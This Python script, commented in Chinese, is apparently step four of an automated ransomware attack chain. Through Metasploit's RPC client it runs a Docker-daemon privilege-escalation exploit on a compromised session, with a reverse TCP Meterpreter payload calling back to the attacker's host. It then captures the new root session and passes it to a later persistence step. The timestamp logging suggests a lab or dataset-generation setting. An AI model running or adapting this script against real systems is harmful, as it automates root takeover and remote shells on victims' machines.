import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient

def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())

def main(argv):
    # 參數檢查：確保有傳入 Session ID
    if len(argv) < 5:
        print("[ERROR] Missing Session ID argument.")
        print("Usage: python3 04_step_Ransomware.py <folder> <my_ip> <target_ip> <SESSION_ID>")
        # 為了相容舊的呼叫方式，這裡可以做個 fallback，但在自動化中建議嚴格檢查
        # return 
        print("[WARNING] Defaulting to Session 1 (Not recommended for automation)")
        session_to_use = '1'
    else:
        session_to_use = argv[4]

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    
    print(f"--- [Step 4] Privilege Escalation (Docker) ---")
    print(f"Target: {target_ip} | Attacker: {my_ip} | Base Session: {session_to_use}")

    # start step 4
    output_time_file_start = 'time_step_4_start.txt'
    record_timestamp(folder, output_time_file_start)
    
    print("Waiting 60s (Script Requirement)...")
    time.sleep(60)

    try:
        client = MsfRpcClient('kali')

        # 1. 檢查指定的 Session 是否存在且活著
        active_sessions = client.sessions.list
        if session_to_use not in active_sessions:
            print(f"[ERROR] Session {session_to_use} does not exist! Aborting.")
            return

        # 2. 記錄攻擊前的 Session 列表 (為了抓出新的 Root Session)
        sessions_before = set(active_sessions.keys())
        print(f"Active Sessions Before PrivEsc: {list(sessions_before)}")

        # 3. 建立 Console
        cid = client.consoles.console().cid
        console = client.consoles.console(cid)
        print(f"Console {cid} created.")

        # 4. 準備指令
        # 注意：LPORT 設為 4444 可能會跟 Step 3 衝突，如果 Step 3 的 shell 還連著。
        # 在真實自動化中，建議每個步驟用不同 Port (例如 Step 3 用 4444, Step 4 用 4445)
        # 這裡為了維持跟原始腳本一致，我保留 4444，但這是一個風險點。
        commands = [
            'use exploit/linux/local/docker_daemon_privilege_escalation',
            f'set SESSION {session_to_use}',
            'set PAYLOAD linux/x86/meterpreter/reverse_tcp',
            f'set LHOST {my_ip}',
            'set LPORT 4444',  
            'set VERBOSE true',
            'run'
        ]

        for cmd in commands:
            console.write(cmd)
            time.sleep(0.5)

        # 5. 即時讀取輸出 (Polling Loop)
        print("--- Metasploit PrivEsc Output ---")
        max_wait_time = 120 
        start_time = time.time()
        
        while True:
            result = console.read()
            data = result.get('data', '')
            
            if data:
                print(data, end='')
                
                # 成功特徵
                if "Meterpreter session" in data and "opened" in data:
                    print("\n[+] Meterpreter session opened!")
                
                # 失敗特徵
                if "Exploit failed" in data or "Aborted" in data:
                    print("\n[-] Exploit failed.")
                    break
            
            if time.time() - start_time > max_wait_time:
                print("\n[!] Timeout waiting for PrivEsc.")
                break
            
            time.sleep(1)

        # 6. 檢查是否有新 Session (預期是 Root 權限的 Meterpreter)
        print("\n--- Checking for New Sessions ---")
        time.sleep(10) # 等待 Session 註冊
        
        sessions_after = set(client.sessions.list.keys())
        new_sessions = sessions_after - sessions_before
        
        if new_sessions:
            new_id = list(new_sessions)[0]
            print(f"[SUCCESS] New Session Created: {new_id}")
            # 輸出這個 ID 給下一步驟 (Step 5 Persistence)
            print(f"NEW_SESSION_ID:{new_id}")
            
            # 驗證權限 (Optional)
            try:
                info = client.sessions.list[new_id]['info']
                print(f"Session Info: {info}") 
            except:
                pass
        else:
            print("[FAILURE] No new session created. Privilege Escalation failed.")

    except Exception as e:
        print(f"An error occurred: {e}")
        pass
    finally:
        if 'console' in locals():
            print(f"Destroying console {cid}...")
            console.destroy()

    time.sleep(30)
    output_time_file_end = 'time_step_4_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)

if __name__ == "__main__":
    main(sys.argv)